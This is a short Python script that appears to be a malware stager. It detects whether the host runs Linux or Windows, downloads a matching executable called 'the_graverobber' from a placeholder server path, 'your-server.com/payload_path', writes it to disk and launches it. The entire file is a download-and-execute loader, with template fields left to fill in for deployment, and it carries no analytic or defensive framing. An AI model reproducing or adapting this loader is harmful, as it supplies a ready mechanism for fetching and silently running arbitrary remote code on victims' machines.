import subprocess
import platform
import requests

platform_os = platform.system()
if platform_os == "Linux":
    filename = "Linux Executable Name"
    exec_name = "the_graverobber"
elif platform_os == "Windows":
    filename = "Windows Exe Name"
    exec_name = "the_graverobber.exe"

data = requests.get("http://your-server.com/payload_path/{0}/{1}".format(platform_os, filename))

with open(exec_name, "wb") as fl:
    fl.write(data.content)
subprocess.Popen(args="", executable=exec_name)
